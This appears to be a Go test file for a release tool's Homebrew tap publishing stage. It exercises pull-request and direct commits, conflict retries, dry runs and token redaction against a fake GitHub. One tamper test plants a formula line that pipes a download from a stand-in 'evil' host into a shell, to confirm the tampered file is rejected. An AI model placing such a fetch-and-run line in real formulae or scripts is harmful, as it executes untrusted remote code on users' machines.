package tap

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"errors"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"

	"github.com/magicdrive/hephaestus/internal/config"
	"github.com/magicdrive/hephaestus/internal/github"
	"github.com/magicdrive/hephaestus/internal/homebrew"
	"github.com/magicdrive/hephaestus/internal/manifest"
	"github.com/magicdrive/hephaestus/internal/tmpl"
)

const (
	token       = "ghs_TAPTOKEN_never_print_me_123456"
	tapRepo     = "acme/homebrew-tap"
	formulaPath = "Formula/tool.rb"
	newFormula  = "class Tool < Formula\n  version \"1.0.0\"\nend\n"
	oldFormula  = "class Tool < Formula\n  version \"0.9.0\"\nend\n"
	prBranch    = "tool-1.0.0"
)

type testLog struct{ t *testing.T }

func (l testLog) Write(p []byte) (int, error) {
	l.t.Log(strings.TrimRight(string(p), "\n"))
	return len(p), nil
}

type fixture struct {
	t   *testing.T
	cfg *config.Config
	man *manifest.Manifest
}

func sum(s string) string {
	h := sha256.Sum256([]byte(s))
	return hex.EncodeToString(h[:])
}

func newFixture(t *testing.T, names ...string) *fixture {
	t.Helper()
	if len(names) == 0 {
		names = []string{"tool"}
	}
	root := t.TempDir()
	m := manifest.New("tool", "1.0.0", "v1.0.0", "abc")
	cfg := &config.Config{Root: root, Project: config.Project{Name: "tool"}}
	for _, name := range names {
		content := strings.ReplaceAll(newFormula, "Tool", strings.ToUpper(name[:1])+name[1:])
		rel := "dist/homebrew/Formula/" + name + ".rb"
		if err := os.MkdirAll(filepath.Join(root, "dist/homebrew/Formula"), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(root, filepath.FromSlash(rel)), []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
		m.Put(manifest.Artifact{Kind: manifest.KindFormula, ID: name, Name: name + ".rb", Path: rel, SHA256: sum(content), Size: int64(len(content)), Source: manifest.Source{Stage: "homebrew"}})
		cfg.Brews = append(cfg.Brews, config.Brew{Name: name, Directory: "Formula", Repository: config.BrewRepository{Owner: "acme", Name: "homebrew-tap"}})
	}
	return &fixture{t: t, cfg: cfg, man: m}
}

func (fx *fixture) brew() *config.Brew { return &fx.cfg.Brews[0] }

func (fx *fixture) direct() {
	for i := range fx.cfg.Brews {
		fx.cfg.Brews[i].Repository.PullRequest = &config.BrewPullRequest{Enabled: github.Bool(false)}
	}
}

func (fx *fixture) input(c *github.Client) Input {
	return Input{
		Config: fx.cfg, Manifest: fx.man, Client: c,
		Vars: tmpl.Vars{Project: "tool", ProjectName: "tool", Version: "1.0.0", Tag: "v1.0.0", Major: "1", Minor: "0", Patch: "0"},
		Log:  testLog{fx.t},
	}
}

func one(t *testing.T) func([]Result, error) Result {
	return func(res []Result, err error) Result {
		t.Helper()
		if err != nil {
			t.Fatal(err)
		}
		if len(res) != 1 {
			t.Fatalf("%d results", len(res))
		}
		return res[0]
	}
}

func TestPullRequestNew(t *testing.T) {
	f := newFake(t, token)
	f.addRepo(tapRepo, "main", map[string]string{formulaPath: oldFormula, "README.md": "tap"})
	fx := newFixture(t)
	fx.brew().CommitAuthor = config.CommitAuthor{Name: "Release Bot", Email: "bot@example.com"}
	fx.brew().Repository.PullRequest = &config.BrewPullRequest{Draft: true}
	r := one(t)(Run(context.Background(), fx.input(f.client(t, token))))
	if r.Status != StatusUpdated || r.Mode != ModePullRequest || r.Branch != prBranch || r.NoOp || r.CommitSHA == "" {
		t.Fatalf("result %+v", r)
	}
	if r.PullRequestURL != "https://github.example/acme/homebrew-tap/pull/1" {
		t.Fatalf("PR URL %q", r.PullRequestURL)
	}
	if got, _ := f.file(tapRepo, prBranch, formulaPath); got != newFormula {
		t.Fatalf("branch content %q", got)
	}
	if got, _ := f.file(tapRepo, "main", formulaPath); got != oldFormula {
		t.Fatal("base branch was modified")
	}
	prs := f.pullList()
	if len(prs) != 1 || prs[0].HeadLabel != "acme:"+prBranch || prs[0].Base != "main" || !prs[0].Draft ||
		prs[0].Title != "Brew formula update for tool version v1.0.0" {
		t.Fatalf("pulls %+v", prs)
	}
	if w := f.writes(); len(w) != 3 {
		t.Fatalf("writes %v", w)
	}
}

func TestPullRequestNewFileAndRerunReuses(t *testing.T) {
	f := newFake(t, token)
	f.addRepo(tapRepo, "main", map[string]string{"README.md": "tap"})
	fx := newFixture(t)
	c := f.client(t, token)
	r := one(t)(Run(context.Background(), fx.input(c)))
	if r.Status != StatusCreated || r.PullRequestURL == "" {
		t.Fatalf("result %+v", r)
	}
	f.resetLog()
	r2 := one(t)(Run(context.Background(), fx.input(c)))
	if r2.Status != StatusUnchanged || !r2.NoOp || r2.PullRequestURL != r.PullRequestURL {
		t.Fatalf("re-run result %+v", r2)
	}
	if w := f.writes(); len(w) != 0 {
		t.Fatalf("re-run wrote: %v", w)
	}
	if len(f.pullList()) != 1 {
		t.Fatal("duplicate pull request")
	}
}

func TestPullRequestBranchExistsWithOldContent(t *testing.T) {
	f := newFake(t, token)
	f.addRepo(tapRepo, "main", map[string]string{formulaPath: oldFormula})
	fx := newFixture(t)
	// A previous run created the branch with an older generation and the PR.
	f.mu.Lock()
	f.repos[tapRepo].branches[prBranch] = f.repos[tapRepo].branches["main"]
	f.addPullLocked(tapRepo, "acme:"+prBranch, prBranch, "main")
	f.mu.Unlock()
	r := one(t)(Run(context.Background(), fx.input(f.client(t, token))))
	if r.Status != StatusUpdated || r.PullRequestURL == "" {
		t.Fatalf("result %+v", r)
	}
	if w := f.writes(); len(w) != 1 || !strings.HasPrefix(w[0], "PUT ") {
		t.Fatalf("writes %v (only the commit expected)", w)
	}
}

func TestUnchangedOnBase(t *testing.T) {
	for _, direct := range []bool{false, true} {
		f := newFake(t, token)
		f.addRepo(tapRepo, "main", map[string]string{formulaPath: newFormula})
		fx := newFixture(t)
		if direct {
			fx.direct()
		}
		r := one(t)(Run(context.Background(), fx.input(f.client(t, token))))
		if r.Status != StatusUnchanged || !r.NoOp {
			t.Fatalf("direct=%t result %+v", direct, r)
		}
		if w := f.writes(); len(w) != 0 {
			t.Fatalf("direct=%t writes %v", direct, w)
		}
		if f.hasBranch(tapRepo, prBranch) {
			t.Fatal("branch created for an unchanged formula")
		}
	}
}

func TestDirectUpdateAndNoOp(t *testing.T) {
	f := newFake(t, token)
	f.addRepo(tapRepo, "trunk", map[string]string{formulaPath: oldFormula})
	fx := newFixture(t)
	fx.direct()
	c := f.client(t, token)
	r := one(t)(Run(context.Background(), fx.input(c)))
	if r.Status != StatusUpdated || r.Mode != ModeDirect || r.Branch != "trunk" || r.CommitSHA == "" || r.PullRequestURL != "" {
		t.Fatalf("result %+v", r)
	}
	if got, _ := f.file(tapRepo, "trunk", formulaPath); got != newFormula {
		t.Fatalf("content %q", got)
	}
	if f.count("POST ") != 0 {
		t.Fatalf("direct mode created refs or PRs: %v", f.writes())
	}
	f.resetLog()
	r = one(t)(Run(context.Background(), fx.input(c)))
	if r.Status != StatusUnchanged || !r.NoOp || len(f.writes()) != 0 {
		t.Fatalf("re-run %+v writes %v", r, f.writes())
	}
}

func TestDirectCreatesNewFileOnConfiguredBranch(t *testing.T) {
	f := newFake(t, token)
	f.addRepo(tapRepo, "main", nil)
	f.setFile(tapRepo, "main", "README.md", "x")
	f.mu.Lock()
	f.repos[tapRepo].branches["stable"] = f.repos[tapRepo].branches["main"]
	f.mu.Unlock()
	fx := newFixture(t)
	fx.direct()
	fx.brew().Repository.Branch = "stable"
	r := one(t)(Run(context.Background(), fx.input(f.client(t, token))))
	if r.Status != StatusCreated || r.Branch != "stable" {
		t.Fatalf("result %+v", r)
	}
	if _, ok := f.file(tapRepo, "main", formulaPath); ok {
		t.Fatal("wrote to the default branch")
	}
}

func TestDirectConflictRecovery(t *testing.T) {
	t.Run("someone else changed it", func(t *testing.T) {
		f := newFake(t, token)
		f.addRepo(tapRepo, "main", map[string]string{formulaPath: oldFormula})
		fx := newFixture(t)
		fx.direct()
		first := true
		f.hook = func(w http.ResponseWriter, r *http.Request, body []byte) bool {
			if r.Method == "PUT" && first {
				first = false
				f.setFile(tapRepo, "main", formulaPath, "class Tool < Formula\n  # concurrent edit\nend\n")
				reply(w, 409, map[string]any{"message": formulaPath + " does not match"})
				return true
			}
			return false
		}
		r := one(t)(Run(context.Background(), fx.input(f.client(t, token))))
		if r.Status != StatusUpdated || f.count("PUT ") != 2 {
			t.Fatalf("result %+v puts %d", r, f.count("PUT "))
		}
		if got, _ := f.file(tapRepo, "main", formulaPath); got != newFormula {
			t.Fatalf("content %q", got)
		}
	})
	t.Run("someone else already published the same content", func(t *testing.T) {
		f := newFake(t, token)
		f.addRepo(tapRepo, "main", map[string]string{formulaPath: oldFormula})
		fx := newFixture(t)
		fx.direct()
		f.hook = func(w http.ResponseWriter, r *http.Request, body []byte) bool {
			if r.Method == "PUT" {
				f.setFile(tapRepo, "main", formulaPath, newFormula)
				reply(w, 409, map[string]any{"message": "does not match"})
				return true
			}
			return false
		}
		r := one(t)(Run(context.Background(), fx.input(f.client(t, token))))
		if r.Status != StatusUpdated || f.count("PUT ") != 1 {
			t.Fatalf("result %+v puts %d", r, f.count("PUT "))
		}
	})
	t.Run("file created concurrently (422 sha missing)", func(t *testing.T) {
		f := newFake(t, token)
		f.addRepo(tapRepo, "main", map[string]string{})
		fx := newFixture(t)
		fx.direct()
		first := true
		f.hook = func(w http.ResponseWriter, r *http.Request, body []byte) bool {
			if r.Method == "PUT" && first {
				first = false
				f.setFile(tapRepo, "main", formulaPath, oldFormula)
			}
			return false // the fake then answers 422 "sha wasn't supplied"
		}
		r := one(t)(Run(context.Background(), fx.input(f.client(t, token))))
		if r.Status == StatusFailed || f.count("PUT ") != 2 {
			t.Fatalf("result %+v puts %d", r, f.count("PUT "))
		}
	})
}

func TestDirectPersistentConflictFails(t *testing.T) {
	f := newFake(t, token)
	f.addRepo(tapRepo, "main", map[string]string{formulaPath: oldFormula})
	fx := newFixture(t)
	fx.direct()
	n := 0
	f.hook = func(w http.ResponseWriter, r *http.Request, body []byte) bool {
		if r.Method == "PUT" {
			n++
			f.setFile(tapRepo, "main", formulaPath, oldFormula+strings.Repeat("#", n))
			reply(w, 409, map[string]any{"message": "does not match"})
			return true
		}
		return false
	}
	res, err := Run(context.Background(), fx.input(f.client(t, token)))
	var ce *ConflictError
	if !errors.As(err, &ce) || ce.Attempts != 3 {
		t.Fatalf("err = %v", err)
	}
	if n != 3 || res[0].Status != StatusFailed || res[0].Err == nil {
		t.Fatalf("puts %d result %+v", n, res[0])
	}
}

func TestCrossRepositoryPullRequest(t *testing.T) {
	f := newFake(t, token)
	f.addRepo("acme/homebrew-tap", "main", map[string]string{formulaPath: oldFormula})
	f.addRepo("bot/homebrew-tap", "main", map[string]string{formulaPath: oldFormula})
	fx := newFixture(t)
	fx.brew().Repository = config.BrewRepository{
		Owner: "bot", Name: "homebrew-tap",
		PullRequest: &config.BrewPullRequest{Base: &config.BrewPRBase{Owner: "acme", Name: "homebrew-tap", Branch: "main"}},
	}
	// Upstream moved on since the fork was created.
	f.setFile("acme/homebrew-tap", "main", "Formula/other.rb", "other")
	r := one(t)(Run(context.Background(), fx.input(f.client(t, token))))
	if r.Status != StatusUpdated || r.Repository != "bot/homebrew-tap" {
		t.Fatalf("result %+v", r)
	}
	if got, _ := f.file("bot/homebrew-tap", prBranch, formulaPath); got != newFormula {
		t.Fatalf("fork branch content %q", got)
	}
	if got, _ := f.file("bot/homebrew-tap", prBranch, "Formula/other.rb"); got != "other" {
		t.Fatal("head branch not based on the upstream base branch")
	}
	prs := f.pullList()
	if len(prs) != 1 || prs[0].BaseRepo != "acme/homebrew-tap" || prs[0].HeadLabel != "bot:"+prBranch || prs[0].Base != "main" {
		t.Fatalf("pulls %+v", prs)
	}
	if r.PullRequestURL != "https://github.example/acme/homebrew-tap/pull/1" {
		t.Fatalf("PR URL %q", r.PullRequestURL)
	}
	// Re-run: nothing new.
	f.resetLog()
	r = one(t)(Run(context.Background(), fx.input(f.client(t, token))))
	if !r.NoOp || len(f.writes()) != 0 || len(f.pullList()) != 1 {
		t.Fatalf("re-run %+v writes %v", r, f.writes())
	}
}

func TestCreatePull422ReSearches(t *testing.T) {
	f := newFake(t, token)
	f.addRepo(tapRepo, "main", map[string]string{formulaPath: oldFormula})
	fx := newFixture(t)
	f.hook = func(w http.ResponseWriter, r *http.Request, body []byte) bool {
		if r.Method == "POST" && strings.HasSuffix(r.URL.Path, "/pulls") {
			// A concurrent run opened the PR first.
			f.mu.Lock()
			f.addPullLocked(tapRepo, "acme:"+prBranch, prBranch, "main")
			f.mu.Unlock()
			reply(w, 422, map[string]any{"message": "Validation Failed", "errors": []any{map[string]any{"message": "A pull request already exists for acme:" + prBranch + "."}}})
			return true
		}
		return false
	}
	r := one(t)(Run(context.Background(), fx.input(f.client(t, token))))
	if r.PullRequestURL != "https://github.example/acme/homebrew-tap/pull/1" || len(f.pullList()) != 1 {
		t.Fatalf("result %+v pulls %+v", r, f.pullList())
	}
}

func TestCreateRefRaceAccepted(t *testing.T) {
	f := newFake(t, token)
	f.addRepo(tapRepo, "main", map[string]string{formulaPath: oldFormula})
	fx := newFixture(t)
	f.hook = func(w http.ResponseWriter, r *http.Request, body []byte) bool {
		if r.Method == "POST" && strings.HasSuffix(r.URL.Path, "/git/refs") {
			f.mu.Lock()
			f.repos[tapRepo].branches[prBranch] = f.repos[tapRepo].branches["main"]
			f.mu.Unlock()
			reply(w, 422, map[string]any{"message": "Reference already exists"})
			return true
		}
		return false
	}
	r := one(t)(Run(context.Background(), fx.input(f.client(t, token))))
	if r.Status != StatusUpdated || r.PullRequestURL == "" {
		t.Fatalf("result %+v", r)
	}
}

func TestSkipUpload(t *testing.T) {
	for _, tc := range []struct {
		skip, prerelease string
		want             string
	}{
		{"true", "", StatusSkipped},
		{"auto", "rc.1", StatusSkipped},
		{"auto", "", StatusUpdated},
	} {
		f := newFake(t, token)
		f.addRepo(tapRepo, "main", map[string]string{formulaPath: oldFormula})
		fx := newFixture(t)
		fx.brew().SkipUpload = tc.skip
		in := fx.input(f.client(t, token))
		in.Vars.Prerelease = tc.prerelease
		r := one(t)(Run(context.Background(), in))
		if r.Status != tc.want {
			t.Fatalf("%+v: result %+v", tc, r)
		}
		if tc.want == StatusSkipped && (len(f.requests()) != 0 || !r.NoOp) {
			t.Fatalf("%+v: skipped formula touched the network: %v", tc, f.requests())
		}
	}
}

func TestDryRun(t *testing.T) {
	t.Run("pull request with client", func(t *testing.T) {
		f := newFake(t, token)
		f.addRepo(tapRepo, "main", map[string]string{formulaPath: oldFormula})
		fx := newFixture(t)
		in := fx.input(f.client(t, token))
		in.DryRun = true
		r := one(t)(Run(context.Background(), in))
		if r.Status != StatusPlanned || r.NoOp {
			t.Fatalf("result %+v", r)
		}
		if w := f.writes(); len(w) != 0 {
			t.Fatalf("dry run wrote: %v", w)
		}
	})
	t.Run("direct with client", func(t *testing.T) {
		f := newFake(t, token)
		f.addRepo(tapRepo, "main", map[string]string{formulaPath: oldFormula})
		fx := newFixture(t)
		fx.direct()
		in := fx.input(f.client(t, token))
		in.DryRun = true
		r := one(t)(Run(context.Background(), in))
		if r.Status != StatusPlanned || len(f.writes()) != 0 {
			t.Fatalf("result %+v writes %v", r, f.writes())
		}
	})
	t.Run("unchanged is reported as such", func(t *testing.T) {
		f := newFake(t, token)
		f.addRepo(tapRepo, "main", map[string]string{formulaPath: newFormula})
		fx := newFixture(t)
		in := fx.input(f.client(t, token))
		in.DryRun = true
		r := one(t)(Run(context.Background(), in))
		if r.Status != StatusUnchanged || !r.NoOp {
			t.Fatalf("result %+v", r)
		}
	})
	t.Run("without a token", func(t *testing.T) {
		fx := newFixture(t)
		in := fx.input(nil)
		in.DryRun = true
		r := one(t)(Run(context.Background(), in))
		if r.Status != StatusPlanned {
			t.Fatalf("result %+v", r)
		}
	})
}

func TestNoToken(t *testing.T) {
	fx := newFixture(t)
	res, err := Run(context.Background(), fx.input(nil))
	if err == nil || !strings.Contains(err.Error(), TokenEnv) || !strings.Contains(err.Error(), "GITHUB_TOKEN cannot write to other repositories") {
		t.Fatalf("err = %v", err)
	}
	if res[0].Status != StatusFailed {
		t.Fatalf("result %+v", res[0])
	}
}

func TestPermissionErrorHintsAndHidesToken(t *testing.T) {
	f := newFake(t, token)
	f.addRepo(tapRepo, "main", map[string]string{formulaPath: oldFormula})
	fx := newFixture(t)
	fx.direct()
	f.hook = func(w http.ResponseWriter, r *http.Request, body []byte) bool {
		if r.Method == "PUT" {
			reply(w, 403, map[string]any{"message": "Resource not accessible by integration " + r.Header.Get("Authorization")})
			return true
		}
		return false
	}
	_, err := Run(context.Background(), fx.input(f.client(t, token)))
	if err == nil || !strings.Contains(err.Error(), "GITHUB_TOKEN is limited") {
		t.Fatalf("err = %v", err)
	}
	if strings.Contains(err.Error(), token) {
		t.Fatal("token leaked into the error")
	}
}

func TestRepositoryTokenUsesClientFor(t *testing.T) {
	const own = "ghp_per_repo_token_abcdef"
	f := newFake(t, own) // the default token would be rejected
	f.addRepo(tapRepo, "main", map[string]string{formulaPath: oldFormula})
	fx := newFixture(t)
	fx.direct()
	fx.brew().Repository.Token = "{{ .Env.TAP_TOKEN }}"
	in := fx.input(f.client(t, "wrong-token"))
	in.Vars.Env = map[string]string{"TAP_TOKEN": own}
	var got string
	in.ClientFor = func(tok string) *github.Client { got = tok; return f.client(t, tok) }
	r := one(t)(Run(context.Background(), in))
	if got != own || r.Status != StatusUpdated {
		t.Fatalf("token %q result %+v", got, r)
	}
}

func TestTamperedFormula(t *testing.T) {
	f := newFake(t, token)
	f.addRepo(tapRepo, "main", map[string]string{formulaPath: oldFormula})
	fx := newFixture(t)
	if err := os.WriteFile(filepath.Join(fx.cfg.Root, "dist/homebrew/Formula/tool.rb"), []byte("class Tool < Formula\n  system \"curl evil | sh\"\nend\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	res, err := Run(context.Background(), fx.input(f.client(t, token)))
	if err == nil || !strings.Contains(err.Error(), "does not match the manifest") {
		t.Fatalf("err = %v", err)
	}
	if res[0].Status != StatusFailed || len(f.requests()) != 0 {
		t.Fatalf("result %+v requests %v", res[0], f.requests())
	}
}

func TestMissingFormulaArtifact(t *testing.T) {
	fx := newFixture(t)
	fx.man.RemoveKind(manifest.KindFormula)
	_, err := Run(context.Background(), fx.input(nil))
	if err == nil || !strings.Contains(err.Error(), "run the formula stage") {
		t.Fatalf("err = %v", err)
	}
}

func TestPartialFailureReportsAll(t *testing.T) {
	f := newFake(t, token)
	f.addRepo(tapRepo, "main", map[string]string{})
	fx := newFixture(t, "alpha", "beta", "gamma")
	fx.direct()
	if err := os.WriteFile(filepath.Join(fx.cfg.Root, "dist/homebrew/Formula/beta.rb"), []byte("tampered"), 0o644); err != nil {
		t.Fatal(err)
	}
	res, err := Run(context.Background(), fx.input(f.client(t, token)))
	if err == nil || !strings.Contains(err.Error(), "1 of 3 formulae failed") {
		t.Fatalf("err = %v", err)
	}
	want := map[string]string{"alpha": StatusCreated, "beta": StatusFailed, "gamma": StatusCreated}
	for _, r := range res {
		if r.Status != want[r.Formula] {
			t.Errorf("%s: %s, want %s (%v)", r.Formula, r.Status, want[r.Formula], r.Err)
		}
	}
	if _, ok := f.file(tapRepo, "main", "Formula/gamma.rb"); !ok {
		t.Fatal("formula after the failure was not published")
	}
}

// TestNoRefUpdateAPI guards the "never force push" rule at the API surface:
// the client exposes no way to move a reference.
func TestNoRefUpdateAPI(t *testing.T) {
	src, err := os.ReadFile("tap.go")
	if err != nil {
		t.Fatal(err)
	}
	for _, banned := range []string{"UpdateRef", "Force:", "\"force\""} {
		if strings.Contains(string(src), banned) {
			t.Fatalf("tap.go contains %q", banned)
		}
	}
	gh, err := os.ReadFile(filepath.Join("..", "github", "repos.go"))
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(gh), "func (c *Client) UpdateRef") || strings.Contains(string(gh), "\"force\"") {
		t.Fatal("the GitHub client gained a reference update")
	}
}

// TestFormulaDirectory follows Homebrew's Tap#formula_dir: the first of
// Formula/, HomebrewFormula/ and the root that exists is the only place
// formulae are read from.
func TestFormulaDirectory(t *testing.T) {
	for _, tc := range []struct {
		name  string
		files map[string]string
		path  string
		want  string // "" means accepted
	}{
		{"new tap", nil, "Formula/tool.rb", ""},
		{"tap without formulae", map[string]string{"README.md": "x"}, "Formula/tool.rb", ""},
		{"root tap", map[string]string{"ark.rb": "x", "README.md": "x"}, "tool.rb", ""},
		{"Formula tap", map[string]string{"Formula/ark.rb": "x", "legacy.rb": "x"}, "Formula/tool.rb", ""},
		{"sharded", map[string]string{"Formula/a/ark.rb": "x"}, "Formula/t/tool.rb", ""},
		{"Formula/ would hide root formulae", map[string]string{"ark.rb": "x", "enma.rb": "x"}, "Formula/tool.rb", "hide them"},
		{"HomebrewFormula/ would hide root formulae", map[string]string{"ark.rb": "x"}, "HomebrewFormula/tool.rb", "hide them"},
		{"root formula in a Formula tap", map[string]string{"Formula/ark.rb": "x"}, "tool.rb", `set directory to "Formula"`},
		{"HomebrewFormula wins over the root", map[string]string{"HomebrewFormula/ark.rb": "x"}, "Formula/tool.rb", `set directory to "HomebrewFormula"`},
		{"subdirectory of a root tap", map[string]string{"ark.rb": "x"}, "pkg/tool.rb", "never be found"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			f := newFake(t, token)
			f.addRepo(tapRepo, "main", tc.files)
			p := &publisher{c: f.client(t, token), p: homebrew.Publish{Path: tc.path}}
			err := p.checkFormulaDir(context.Background(), "acme", "homebrew-tap", "main")
			if tc.want == "" && err != nil || tc.want != "" && (err == nil || !strings.Contains(err.Error(), tc.want)) {
				t.Fatalf("err = %v, want %q", err, tc.want)
			}
		})
	}
}

// TestFormulaDirectoryBlocksPublishing checks that a misplaced formula is
// refused before anything is written, in both modes.
func TestFormulaDirectoryBlocksPublishing(t *testing.T) {
	for _, direct := range []bool{false, true} {
		f := newFake(t, token)
		f.addRepo(tapRepo, "main", map[string]string{"ark.rb": "class Ark < Formula\nend\n"})
		fx := newFixture(t)
		if direct {
			fx.direct()
		}
		res, err := Run(context.Background(), fx.input(f.client(t, token)))
		if err == nil || len(res) != 1 || res[0].Status != StatusFailed || !strings.Contains(err.Error(), "hide them") {
			t.Fatalf("direct=%v: %+v, %v", direct, res, err)
		}
		if w := f.writes(); len(w) != 0 {
			t.Fatalf("direct=%v: writes %v", direct, w)
		}
	}
}

// TestLostResponses: a write that GitHub applied but whose response was
// lost (502) is never repeated as a second commit, branch or pull request.
// The client retries the PUT itself (the blob SHA makes the retry fail
// instead of committing twice) and never retries a POST: the tap stage
// re-reads the branch or the pull requests instead.
func TestLostResponses(t *testing.T) {
	lost := func(f *fakeGitHub, method, suffix string, apply func()) {
		first := true
		f.hook = func(w http.ResponseWriter, r *http.Request, body []byte) bool {
			if r.Method == method && strings.HasSuffix(r.URL.Path, suffix) && first {
				first = false
				apply()
				reply(w, 502, map[string]any{"message": "Bad Gateway"})
				return true
			}
			return false
		}
	}
	t.Run("commit", func(t *testing.T) {
		f := newFake(t, token)
		f.addRepo(tapRepo, "main", map[string]string{formulaPath: oldFormula})
		fx := newFixture(t)
		fx.direct()
		before := f.repos[tapRepo].branches["main"]
		lost(f, "PUT", "/contents/"+formulaPath, func() { f.setFile(tapRepo, "main", formulaPath, newFormula) })
		r := one(t)(Run(context.Background(), fx.input(f.client(t, token))))
		if r.Status != StatusUpdated {
			t.Fatalf("result %+v\n%v", r, f.requests())
		}
		f.mu.Lock()
		head := f.repos[tapRepo].branches["main"]
		parent := f.parents[head]
		f.mu.Unlock()
		if parent != before {
			t.Fatalf("more than one commit after a lost response:\n%v", f.requests())
		}
	})
	t.Run("branch", func(t *testing.T) {
		f := newFake(t, token)
		f.addRepo(tapRepo, "main", map[string]string{formulaPath: oldFormula})
		fx := newFixture(t)
		lost(f, "POST", "/git/refs", func() {
			f.mu.Lock()
			f.repos[tapRepo].branches[prBranch] = f.repos[tapRepo].branches["main"]
			f.mu.Unlock()
		})
		r := one(t)(Run(context.Background(), fx.input(f.client(t, token))))
		if r.Status != StatusUpdated || r.PullRequestURL == "" || f.count("POST /repos/"+tapRepo+"/git/refs") != 1 {
			t.Fatalf("result %+v\n%v", r, f.requests())
		}
		if got, _ := f.file(tapRepo, prBranch, formulaPath); got != newFormula || len(f.pullList()) != 1 {
			t.Fatalf("branch content %q, pulls %v", got, f.pullList())
		}
	})
	t.Run("branch not created", func(t *testing.T) {
		f := newFake(t, token)
		f.addRepo(tapRepo, "main", map[string]string{formulaPath: oldFormula})
		fx := newFixture(t)
		lost(f, "POST", "/git/refs", func() {})
		res, err := Run(context.Background(), fx.input(f.client(t, token)))
		if err == nil || len(res) != 1 || res[0].Status != StatusFailed || !strings.Contains(err.Error(), "502") ||
			f.count("POST /repos/"+tapRepo+"/git/refs") != 1 || f.count("PUT ") != 0 || len(f.pullList()) != 0 {
			t.Fatalf("results %+v, err %v\n%v", res, err, f.requests())
		}
	})
}

// TestBranchAppearingWithOtherChangesIsRejected: a head branch created by
// someone else between the check that it is missing and the create (422,
// or a lost response) is verified like any existing branch before the
// formula is committed to it and proposed.
func TestBranchAppearingWithOtherChangesIsRejected(t *testing.T) {
	for _, status := range []int{422, 502} {
		t.Run(strconv.Itoa(status), func(t *testing.T) {
			f := newFake(t, token)
			f.addRepo(tapRepo, "main", map[string]string{formulaPath: oldFormula})
			fx := newFixture(t)
			first := true
			f.hook = func(w http.ResponseWriter, r *http.Request, body []byte) bool {
				if r.Method == "POST" && strings.HasSuffix(r.URL.Path, "/git/refs") && first {
					first = false
					f.mu.Lock()
					f.repos[tapRepo].branches[prBranch] = f.repos[tapRepo].branches["main"]
					f.setFileLocked(tapRepo, prBranch, ".github/workflows/x.yml", "on: push")
					f.mu.Unlock()
					reply(w, status, map[string]any{"message": "Reference already exists"})
					return true
				}
				return false
			}
			_, err := Run(context.Background(), fx.input(f.client(t, token)))
			if err == nil || !strings.Contains(err.Error(), ".github/workflows/x.yml") || f.count("PUT ") != 0 || len(f.pullList()) != 0 {
				t.Fatalf("err %v\n%v", err, f.requests())
			}
		})
	}
}
